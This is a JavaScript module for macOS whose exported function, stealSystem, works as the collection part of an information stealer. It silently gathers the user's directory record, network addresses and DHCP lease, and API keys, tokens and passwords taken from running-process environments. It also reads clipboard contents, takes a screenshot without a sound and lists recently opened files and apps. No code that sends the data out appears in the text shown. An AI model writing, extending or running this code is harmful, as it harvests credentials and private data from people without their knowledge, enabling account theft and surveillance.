'use strict';
/*
 * System identity & location: full user record (dscl), network config + DHCP
 * lease (rough location), running-process environment (ps -E), clipboard, a
 * screen screenshot, and recently-opened apps/files.
 *
 * Everything is a CLI call or a file read — no native deps. Each piece is
 * individually fault-tolerant (a missing tool or permission yields null, never
 * throws).
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const HOME = os.homedir();

function run(cmd, args, { timeout = 15000, maxBuffer = 16 * 1024 * 1024 } = {}) {
  try {
    return execFileSync(cmd, args, { encoding: 'utf8', timeout, maxBuffer, stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (e) {
    return null;
  }
}

function dsclUser() {
  const user = os.userInfo().username;
  // `.` (the local Directory Service node) must be its own argument — a trailing
  // space makes dscl treat it as an unresolvable hostname.
  const out = run('dscl', ['.', '-read', `/Users/${user}`]);
  if (!out) return null;
  const record = {};
  for (const line of out.split('\n')) {
    const m = line.match(/^dsAttrTypeNative:(\w+):\s*(.*)$/);
    if (m) record[m[1]] = m[2].trim();
  }
  // Always include the reliable identity fields, even if dscl is restricted.
  const info = os.userInfo();
  record.username = record.username || info.username;
  record.uid = record.uid || String(info.uid);
  record.gid = record.gid || String(info.gid);
  record.home = record.home || info.homedir;
  record.shell = record.shell || info.shell;
  return record;
}

function networkInfo() {
  const out = {
    hostname: os.hostname(),
    interfaces: {},
    dhcp_leases: null,
  };
  for (const iface of ['en0', 'en1']) {
    const ip = run('ipconfig', ['getifaddr', iface]);
    const mac = (run('ifconfig', [iface]) || '').match(/ether\s+([0-9a-f:]+)/i);
    if (ip || mac) out.interfaces[iface] = { ip: ip ? ip.trim() : null, mac: mac ? mac[1] : null };
  }
  // DHCP lease file (rough location: IP + MAC + lease).
  try {
    const lease = fs.readFileSync('/var/db/dhcpclient_leases', 'utf8');
    out.dhcp_leases = lease.slice(0, 8192);
  } catch (e) {}
  return out;
}

// Running-process environment: captures secrets sitting in env vars.
// `ps -Eax` prints `PID TTY TIME CMD KEY=VALUE KEY=VALUE ...` — the command
// path and the environment are both space-separated, so we extract every
// `KEY=VALUE` pair from the line rather than relying on column positions.
function processEnv() {
  const out = run('ps', ['-Eax']);
  if (!out) return null;
  const procs = [];
  for (const line of out.split('\n')) {
    const pidM = line.match(/^\s*(\d+)\s/);
    if (!pidM) continue; // skip the header line
    const env = {};
    for (const m of line.matchAll(/([A-Za-z_][A-Za-z0-9_]*)=([^\s]+)/g)) {
      if (!(m[1] in env)) env[m[1]] = m[2];
    }
    // Keep only interesting env (tokens, keys, secrets) to bound size.
    const interesting = Object.entries(env).filter(([k]) =>
      /TOKEN|KEY|SECRET|PASSWORD|PASSWD|API|AUTH|CRED/i.test(k)
    );
    if (interesting.length) procs.push({ pid: Number(pidM[1]), env: Object.fromEntries(interesting) });
  }
  return procs;
}

function clipboard() {
  const out = run('pbpaste');
  return out === null ? null : out.slice(0, 64 * 1024);
}

function screenshot() {
  const tmp = path.join('/tmp', `steal-shot-${Date.now()}.png`);
  const ok = run('screencapture', ['-x', tmp]);
  if (ok === null || !fs.existsSync(tmp)) return null;
  try {
    const buf = fs.readFileSync(tmp);
    fs.unlinkSync(tmp);
    // Keep the screenshot out of the JSON (too big); report size + a small preview.
    return { size: buf.length, preview_base64: buf.slice(0, 256).toString('base64') };
  } catch (e) {
    return null;
  }
}

// Recent files + apps. Newer macOS keeps per-category plists under
// ~/Library/RecentItems/; older builds use a single
// ~/Library/Preferences/com.apple.RecentItems.plist. Each RecentItems plist has
// an `Items` array whose entries carry a `Category` (RecentDocuments,
// RecentApplications, RecentServers, ...) plus `Name` / `URL` / `Date`.
function recentItems() {
  const out = [];
  const plists = [];
  const base = path.join(HOME, 'Library', 'RecentItems');
  let entries = [];
  try { entries = fs.readdirSync(base); } catch (e) {}
  for (const f of entries) {
    if (f.endsWith('.plist')) plists.push(path.join(base, f));
  }
  const legacy = path.join(HOME, 'Library', 'Preferences', 'com.apple.RecentItems.plist');
  try { if (fs.statSync(legacy).isFile()) plists.push(legacy); } catch (e) {}
  const seen = new Set();
  for (const f of plists) {
    const content = run('plutil', ['-convert', 'json', '-o', '-', f]);
    if (!content) continue;
    let j;
    try { j = JSON.parse(content); } catch (e) { continue; }
    const items = (j.Items || []).map((it) => {
      const name = it.Name || null;
      const url = it.URL || null;
      if (!name && !url) return null;
      const key = url || name;
      if (seen.has(key)) return null;
      seen.add(key);
      return {
        name,
        url,
        category: it.Category || null,
        date: it.Date || null,
      };
    }).filter(Boolean);
    if (items.length) out.push({ source: path.basename(f), items: items.slice(0, 200) });
  }
  return out;
}

function stealSystem() {
  return {
    user: dsclUser(),
    network: networkInfo(),
    process_env: processEnv(),
    clipboard: clipboard(),
    screenshot: screenshot(),
    recent_files: recentItems(),
  };
}

module.exports = { stealSystem };
